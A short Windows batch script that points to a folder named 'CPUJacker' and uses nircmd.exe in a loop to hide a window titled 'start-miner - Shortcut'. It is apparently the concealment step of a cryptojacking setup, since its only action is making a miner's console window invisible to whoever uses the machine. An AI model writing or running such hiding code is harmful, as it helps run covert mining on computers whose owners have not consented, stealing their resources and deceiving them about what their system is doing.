@echo off
set nircmd_dir=C:\CPUJacker

for /L %%a in (1,1,10) do (
    "%nircmd_dir%\nircmd.exe" win hide title "start-miner - Shortcut"
)
